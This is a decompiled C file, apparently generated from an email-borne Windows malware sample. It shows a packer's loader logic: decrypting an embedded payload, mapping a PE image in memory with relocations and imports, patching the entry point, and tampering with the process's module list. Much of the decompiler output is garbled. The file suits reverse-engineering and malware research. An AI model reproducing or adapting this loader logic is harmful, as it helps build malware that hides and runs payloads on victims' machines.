// subject.c
// Generated on TIMESTAMP by decompiling malware_via_email/malware_1193/ia32_pe/subject.exe
// using Decompiler version VERSION

#include "subject.h"

byte * fn00401030(Eq_28 dwArg04, Eq_211 * dwArg08, Eq_28 dwArg0C)
{
	globals->dw4072E8 = 0x00000000;
	while (globals->dw4072E8 < dwArg0C)
	{
		edx = dwArg04 + globals->dw4072E8;
		*edx = dwArg08[globals->dw4072E8];
		globals->dw4072E8 = globals->dw4072E8 + 0x00000001;
	}
	return edx;
}

void fn004010C0(word32 ebx, word32 ebp, word32 esi, word32 edi, Eq_226 * fs, word32 dwArg04)
{
	Eq_28 dwLoc18_20 = GetModuleHandleA(0x00000000);
	LoadIconA(0x00000000, 0x00007F00);
	globals->dw4072E8 = 0x00000491;
	globals->t4072F0 = dwArg04;
	if ((globals->t4072F0 & 0x0000FFFF) != 0x00000000)
		globals->dw407300 = 0x00000000;
	else
		globals->dw407300 = 0x00000001;
	if (globals->t4072F0 == 0x00000000)
		globals->dw407300 = 0x00000000;
	if (globals->dw407300 != 0x00000000)
		dwLoc18_20 = globals->t4072F0;
	&*fp->tFFFFFEA4.u0 = 0x000000E6;
	Mem45[fp - 0x00000160:word32] = fp + 0xFFFFFEB4;
	GetWindowsDirectoryA(0x00000000, 0x00007F00);
	&*fp->tFFFFFEA4.u0 = 0x00407290;
	Mem52[fp - 0x00000160:word32] = fp + 0xFFFFFEB4;
	lstrcatA(0x00000000, (Eq_1185 *) 0x00007F00);
	&*fp->tFFFFFEA4.u0 = 0x00000000;
	Mem58[fp - 0x00000160:word32] = 0x00000080;
	if (CreateFileA(&fp->tFFFFFEA4, 0x00000080, 0x00000003, 0x00000000, 0x00000003, 0x00000000, (Eq_1185 *) 0x00007F00) == 0xFFFFFFFF)
	{
l0040133C:
		return;
	}
	else
	{
		&*fp->tFFFFFEA4.u0 = 0x004072A4;
		Mem120[fp - 0x00000160:word32] = fp + 0xFFFFFEB4;
		lstrcatA(0x00000080, null);
		&*fp->tFFFFFEA4.u0 = 0x00000000;
		Mem126[fp - 0x00000160:word32] = 0x00000080;
		&*fp->tFFFFFEA4.u0 = 0x00000003;
		Mem130[fp - 0x00000168:word32] = 0x00000000;
		Mem132[fp - 0x0000016C:word32] = 0x00000003;
		Mem134[fp - 0x00000170:word32] = 0x00000080;
		if (CreateFileA(&fp->tFFFFFEA4, 0x00000080, 0x00000003, 0x00000000, 0x00000003, 0x00000080, null) != 0xFFFFFFFF)
			goto l0040133C;
		else
		{
			globals->dw4072E8 = 0x00000222;
			globals->dw4072E8 = 0x00001ABE;
			Eq_180 * dwLoc08_149 = null;
			while (dwLoc08_149 <u (Eq_180 *) 0x00005200)
			{
				&*fp->tFFFFFEA4.u0 = 0x00000000;
				GetModuleHandleA(null);
				dwLoc08_149->dw402001 = dwLoc08_149->dw402001 + dwLoc08_149;
				dwLoc08_149->dw402001 = &dwLoc08_149->dw402001 ^ dwLoc08_149->dw402001;
				dwLoc08_149 = dwLoc08_149 + 1;
			}
			&*fp->tFFFFFEA4.u0 = 0x00005200;
			globals->t4072FC = fn004019B0(0x00007F00);
			&*fp->tFFFFFEA4.u0 = 0x00005200;
			Mem191[fp - 0x00000160:word32] = 0x00402001;
			fp->tFFFFFEA4 = globals->t4072FC;
			fn00401030(0x00000003, null, 0x00007F00);
			globals->dw4072EC = edi;
			globals->dw4072E4 = esi;
			globals->dw4072F8 = ebx;
			globals->ptr407308 = fs->ptr0018;
			globals->ptr4072F4 = fp - 0x00000004;
			&*fp->tFFFFFEA4.u0 = 0x004072C0;
			globals->t407304 = GetModuleHandleA(null);
			Eq_243 dwLoc08_212 = 0x00000000;
			while (dwLoc08_212 <u 0x00000007)
			{
				0x00407320[dwLoc08_212 * 0x00000004] = fn00401350(globals->t407304, dwLoc08_212 *s 0x00000013 + 0x00407208);
				dwLoc08_212 = dwLoc08_212 + 0x00000001;
			}
			word32 eax_246 = 0x004012FB - dwLoc18_20;
			word32 ebp_250 = fn004019E0(eax_246, dwLoc18_20);
			Eq_28 ecx_253 = globals->t4072FC;
			fp->tFFFFFEA4 = ecx_253;
			fn004013A0(ebp_250, dwArg00);
			Eq_232 * esp_260 = globals->ptr4072F4;
			if (globals->dw407300 != 0x00000000)
				esp_260->t0008 = globals->t4072FC;
			Mem255[0x0040733C:word32]();
			return;
		}
	}
}

word32 fn00401350(Eq_28 dwArg04, Eq_211 * dwArg08)
{
	return GetProcAddress(dwArg04, dwArg08);
}

word32 fn00401370(Eq_28 dwArg04)
{
	globals->dw4072E8 = 0x00000001;
	word32 * edx_13 = dwArg04 + 0x00000078 + globals->dw4072E8 * 0x00000008;
	GetCommandLineA();
	return *edx_13;
}

void fn004013A0(word32 ebp, word32 dwArg04)
{
	Eq_350 * ebp_149 = fp - 0x00000004;
	if (globals->dw407300 != 0x00000000)
	{
		Eq_28 eax_661 = globals->t4072F0;
		dwLoc08 = Mem0[eax_661 + 0x00000050 + Mem0[eax_661 + 0x0000003C:word32]:word32];
	}
	Eq_28 ecx_20 = dwArg04 + Mem0[dwArg04 + 0x0000003C:word32];
	word32 edx_26 = ecx_20 + 0x00000018 + (word32) Mem0[ecx_20 + 0x00000014:word16];
	Mem0[0x0040732C:word32]();
	fn00401030(ecx_20, dwArg04, Mem0[dwArg04 + 0x0000003C:word32] + 0x00000138 + (word32) Mem0[ecx_20 + 0x00000006:word16] *s 0x00000028);
	Eq_364 * dwLoc28_27 = edx_26;
	up32 dwLoc14_60 = 0x00000000;
	while (dwLoc14_60 <u (word32) Mem0[ecx_20 + 0x00000006:word16])
	{
		if (dwLoc28_27->dw0014 != 0x00000000 && dwLoc28_27->dw0010 != 0x00000000)
		{
			word32 eax_101 = Mem0[dwLoc28_27 + 0x00000010:word32] - 0x00000001 + Mem0[ecx_20 + 0x0000003C:word32];
			fn00401030(ecx_20 + Mem0[dwLoc28_27 + 0x0000000C:word32], dwArg04 + Mem0[dwLoc28_27 + 0x00000014:word32], SEQ(SEQ(0x00000000, eax_101) % Mem0[ecx_20 + 0x0000003C:word32], eax_101) /u Mem0[ecx_20 + 0x0000003C:word32] *s Mem0[ecx_20 + 0x0000003C:word32]);
		}
		dwLoc28_27 = dwLoc28_27 + 1;
		dwLoc14_60 = dwLoc14_60 + 0x00000001;
	}
	Eq_28 dwLoc10_146;
	word32 ecx_130 = ecx_20 + Mem0[ecx_20 + 0x0000003C:word32];
	Eq_28 eax_138 = fn00401370(ecx_130) + ecx_20;
	word32 * esp_137 = fp - 0x000000D8;
	Eq_28 dwLocB8_140 = eax_138;
	if (globals->dw407300 == 0x00000000)
	{
		eax_138 = ecx_130;
		esp_137 = fp - 0x000000F0;
		Mem0[0x00407324:word32]();
		dwLoc10_146 = ecx_130;
		goto l00401514;
	}
	&*dwLoc10_146.u0 = 0x00000000;
l00401514:
	while (Mem0[dwLocB8_140 + 0x00000010:word32] != 0x00000000)
	{
		Eq_488 * dwLoc34_179;
		Eq_489 * dwLoc24_178;
		word32 ecx_169 = ecx_20 + Mem0[dwLocB8_140 + 0x0000000C:word32];
		esp_137 = esp_137 - 0x00000004;
		*esp_137 = ecx_169;
		Mem172[0x00407338:word32]();
		GetCommandLineA();
		if (Mem172[dwLocB8_140 + 0x00000000:word32] != 0x00000000)
		{
			dwLoc24_178 = ecx_20 + Mem172[dwLocB8_140 + 0x00000000:word32];
			GetCommandLineA();
			dwLoc34_179 = ecx_20 + Mem172[dwLocB8_140 + 0x00000010:word32];
		}
		else
		{
			dwLoc24_178 = ecx_20 + Mem172[dwLocB8_140 + 0x00000010:word32];
			GetCommandLineA();
			dwLoc34_179 = ecx_20 + Mem172[dwLocB8_140 + 0x00000000:word32];
		}
		if (Mem172[dwLocB8_140 + 0x00000010:word32] != 0x00000000 && Mem172[dwLocB8_140 + 0x00000000:word32] != 0x00000000)
		{
			ebp_149->dwFFFFFFEC = 0x00000001;
			goto l004015B8;
		}
l004015B8:
		while (dwLoc24_178->ptr0000 != null)
		{
			if ((dwLoc24_178->ptr0000 & 0x80000000) != 0x00000000)
			{
				Eq_646 * esp_228 = esp_137 - 0x00000004;
				esp_228->dw0000 = dwLoc24_178->ptr0000 & 0x7FFFFFFF;
				Mem232[esp_228 - 0x00000004:word32] = dwLocB8_140;
				dwLoc24_178->ptr0000 = fn00401350(dwArg00, dwArg04);
				esp_137 = esp_228 + 0x00000004;
			}
			else
			{
				Eq_623 * esp_243 = esp_137 - 0x00000004;
				Mem244[esp_243 + 0x00000000:word32] = Mem172[dwLoc24_178 + 0x00000000:word32] + 0x00000002 + ecx_20;
				Mem247[esp_243 - 0x00000004:word32] = dwLocB8_140;
				dwLoc24_178->ptr0000 = fn00401350(dwArg00, dwArg04);
				esp_137 = esp_243 + 0x00000004;
			}
			if (0x00000000 != 0x00000000)
				dwLoc34_179->ptr0000 = dwLoc24_178->ptr0000;
			GetCommandLineA();
			dwLoc24_178 = dwLoc24_178 + 1;
			dwLoc34_179 = dwLoc34_179 + 1;
		}
		eax_138 = GetCommandLineA();
		dwLocB8_140 = dwLocB8_140 + 0x00000014;
	}
	if (globals->dw407300 == 0x00000000)
	{
		eax_138 = Mem0[ecx_130 + 0x00000034:word32];
		Eq_540 * esp_622 = esp_137 - 0x00000004;
		esp_622->t0000 = eax_138;
		Mem625[esp_622 - 0x00000004:word32] = 0x00000000;
		Mem627[esp_622 - 0x00000008:word32] = 0x00000000;
		Mem629[esp_622 - 0x0000000C:word32] = 0x00000000;
		Mem631[esp_622 - 0x00000010:word32] = 0x00000022;
		esp_622->t0000 = dwLoc10_146;
		esp_137 = esp_622 - 0x00000014;
		Mem634[0x00407334:word32]();
		globals->t4072E0 = eax_138;
	}
	else
		&*globals->t4072E0.u0 = 0x00000000;
	if (globals->t4072E0 != 0x00000000)
		goto l00401745;
	else
	{
		if (globals->dw407300 != 0x00000000)
			dwLoc0C = globals->t4072F0;
		else
			dwLoc0C = Mem0[ecx_130 + 0x00000034:word32];
		Eq_602 * esp_531 = esp_137 - 0x00000004;
		esp_531->t0000 = dwLoc0C;
		Mem532[0x00407320:word32]();
		if (eax_138 == 0x00000000)
		{
			Mem600[esp_531 - 0x00000004:word32] = 0x00008000;
			Mem602[esp_531 - 0x00000008:word32] = 0x00000000;
			esp_531->t0000 = dwLoc0C;
			esp_531 = esp_531 - 0x0000000C;
			Mem605[0x00407330:word32]();
			if (dwLoc0C == 0x00000000)
				;
			else
			{
l004016DE:
				if (globals->dw407300 == 0x00000000)
				{
					word32 edx_548 = Mem532[ecx_130 + 0x00000034:word32];
					Eq_786 * esp_549 = esp_531 - 0x00000004;
					esp_549->t0000 = edx_548;
					Mem552[esp_549 - 0x00000004:word32] = 0x00000000;
					Mem554[esp_549 - 0x00000008:word32] = 0x00000000;
					Mem556[esp_549 - 0x0000000C:word32] = 0x00000000;
					Mem558[esp_549 - 0x00000010:word32] = 0x00000022;
					esp_549->t0000 = dwLoc10_146;
					esp_137 = esp_549 - 0x00000014;
					Mem561[0x00407334:word32]();
					globals->t4072E0 = dwLoc10_146;
					if (globals->t4072E0 == 0x00000000)
					{
						Mem577[esp_549 - 0x00000018:word32] = 0x00000040;
						Mem579[esp_549 - 0x0000001C:word32] = 0x00003000;
						word32 edx_581 = Mem579[ecx_130 + 0x00000050:word32];
						esp_549->t0000 = edx_581;
						word32 ecx_585 = Mem583[ecx_130 + 0x00000034:word32];
						esp_549->t0000 = ecx_585;
						esp_137 = esp_549 - 0x00000024;
						Mem587[0x0040732C:word32]();
						globals->t4072E0 = ecx_130;
					}
				}
				else
				{
					Eq_762 * esp_589 = esp_531 - 0x00000004;
					esp_589->dw0000 = 0x00000040;
					esp_589->dw0000 = 0x00003000;
					esp_589->dw0000 = dwLoc08;
					Mem598[esp_589 - 0x0000000C:word32] = dwLoc0C;
					esp_137 = esp_589 - 0x0000000C;
					Mem598[0x0040732C:word32]();
				}
l00401745:
				if (globals->dw407300 == 0x00000000)
				{
					Eq_682 * esp_356 = esp_137 - 0x00000004;
					Mem357[esp_356 + 0x00000000:word32] = Mem0[ecx_130 + 0x00000050:word32];
					esp_356->t0000 = ecx_20;
					Eq_28 ecx_361 = globals->t4072E0;
					esp_356->t0000 = ecx_361;
					fn00401030(dwArg00, dwArg04, dwArg08);
					esp_356->t0000 = dwLoc10_146;
					Mem370[0x00407328:word32]();
					esp_356->t0000 = globals->t4072E0;
					fn00401B30(dwArg00);
					Mem379[0x0040733C:word32] = Mem373[0x004072E0:word32] + Mem373[ecx_130 + 0x00000028:word32];
					Mem382[ecx_130 + 0x00000028:word32] = Mem379[0x0040733C:word32];
				}
				else
				{
					globals->t4072E0 = ecx_20;
					word32 ecx_392 = ecx_20 - Mem389[ecx_130 + 0x00000034:word32];
					if (Mem389[ecx_130 + 0x000000A4:word32] != 0x00000000)
					{
						word32 dwLoc20_457 = ecx_20 + Mem389[ecx_130 + 0x000000A0:word32];
						while (dwLoc20_457->dw0004 != 0x00000000)
						{
							uint32 ecx_472 = dwLoc20_457->dw0004 - 0x00000008 >>u 0x00000001;
							word16 * edx_475[] = &dwLoc20_457->a0008[0];
							uint32 dwLoc14_478 = 0x00000000;
							while (dwLoc14_478 <u ecx_472)
							{
								if ((word32) edx_475[dwLoc14_478] >> 0x0000000C == 0x00000003)
									(ecx_20 + Mem389[dwLoc20_457 + 0x00000000:word32])[(word32) edx_475[dwLoc14_478] & 0x00000FFF] = (ecx_20 + Mem389[dwLoc20_457 + 0x00000000:word32])[(word32) edx_475[dwLoc14_478] & 0x00000FFF] + ecx_392;
								dwLoc14_478 = dwLoc14_478 + 0x00000001;
							}
							dwLoc20_457 = dwLoc20_457 + Mem389[dwLoc20_457 + 0x00000004:word32];
						}
					}
					Mem407[0x0040733C:word32] = Mem389[0x004072E0:word32] + Mem389[ecx_130 + 0x00000028:word32];
					word32 ecx_410 = dwLoc0C + Mem407[ecx_130 + 0x00000028:word32];
					Mem419[ecx_130 + 0x00000016:word16] = (word16) ((word32) Mem407[ecx_130 + 0x00000016:word16] | 0x00002000);
					Eq_870 * esp_421 = esp_137 - 0x00000004;
					esp_421->t0000 = fp + 0xFFFFFF40;
					Mem424[esp_421 - 0x00000004:word32] = 0x00000040;
					&*esp_421->t0000.u0 = 0x00000006;
					Mem429[esp_421 - 0x0000000C:word32] = ecx_410;
					VirtualProtect(esp_421->t0000, esp_421->t0000, esp_421->t0000, esp_421->t0000);
					Mem433[ecx_410 + 0x00000000:byte] = 0x68;
					Mem435[ecx_410 + 0x00000001:word32] = Mem433[0x0040733C:word32];
					Mem436[ecx_410 + 0x00000005:byte] = 0xC3;
					globals->t4072FC = globals->t4072E0;
					esp_421->t0000 = globals->t4072E0;
					Mem447[esp_421 - 0x00000004:word32] = Mem441[0x004072E0:word32] + Mem441[ecx_130 + 0x00000028:word32];
					esp_421->t0000 = globals->t4072F0;
					fn00401930(dwArg00, dwArg04, dwArg08);
				}
			}
		}
		else
			goto l004016DE;
	}
	return;
}

void fn00401930(Eq_28 dwArg04, Eq_211 * dwArg08, Eq_28 dwArg0C)
{
	Eq_1014 * ecx_14 = globals->ptr407308->ptr0030->ptr000C->ptr000C;
	Eq_1014 * dwLoc0C_15 = ecx_14;
	while (0x00000001 != 0x00000000)
	{
		if (dwLoc0C_15 == null)
			goto l004019A5;
		if (dwLoc0C_15->dw0018 == dwArg04)
		{
			dwLoc0C_15->dw001C = dwArg08;
			dwLoc0C_15->dw0018 = dwArg0C;
			goto l004019A5;
		}
		Eq_1014 * edx_57 = dwLoc0C_15->ptr0000;
		dwLoc0C_15 = edx_57;
		if (edx_57 == ecx_14)
			goto l004019A5;
	}
l004019A5:
	return;
}

word32 fn004019B0(word32 dwArg04)
{
	GetCommandLineA();
	return HeapAlloc(GetProcessHeap(), 0x00000000, dwArg04);
}

word32 fn004019E0(word32 dwArg04, Eq_28 dwArg08)
{
	Eq_28 edx_16 = dwArg08 + Mem0[dwArg08 + 0x0000003C:word32];
	Mem0[0x0040732C:word32]();
	globals->t4072E0 = edx_16;
	if (globals->t4072E0 == 0x00000000)
		return ebp;
	else
	{
		fn00401030(globals->t4072E0, dwArg08, Mem32[edx_16 + 0x00000050:word32]);
		word32 eax_79 = globals->t4072E0 - dwArg08;
		if (Mem32[edx_16 + 0x000000A4:word32] != 0x00000000)
		{
			word32 dwLoc0C_107 = dwArg08 + Mem32[edx_16 + 0x000000A0:word32];
			while (dwLoc0C_107->dw0004 != 0x00000000)
			{
				uint32 eax_122 = dwLoc0C_107->dw0004 - 0x00000008 >>u 0x00000001;
				word16 * ecx_125[] = &dwLoc0C_107->a0008[0];
				uint32 dwLoc08_128 = 0x00000000;
				while (dwLoc08_128 <u eax_122)
				{
					if ((word32) ecx_125[dwLoc08_128] >> 0x0000000C == 0x00000003)
						(Mem32[0x004072E0:word32] + Mem32[dwLoc0C_107 + 0x00000000:word32])[(word32) ecx_125[dwLoc08_128] & 0x00000FFF] = (Mem32[0x004072E0:word32] + Mem32[dwLoc0C_107 + 0x00000000:word32])[(word32) ecx_125[dwLoc08_128] & 0x00000FFF] + eax_79;
					dwLoc08_128 = dwLoc08_128 + 0x00000001;
				}
				dwLoc0C_107 = dwLoc0C_107 + Mem32[dwLoc0C_107 + 0x00000004:word32];
			}
		}
		return fp - 0x00000004;
	}
}

void fn00401B30(Eq_28 dwArg04)
{
	Eq_228 * edx_7 = globals->ptr407308;
	edx_7->ptr0030->dw0008 = dwArg04;
	return;
}

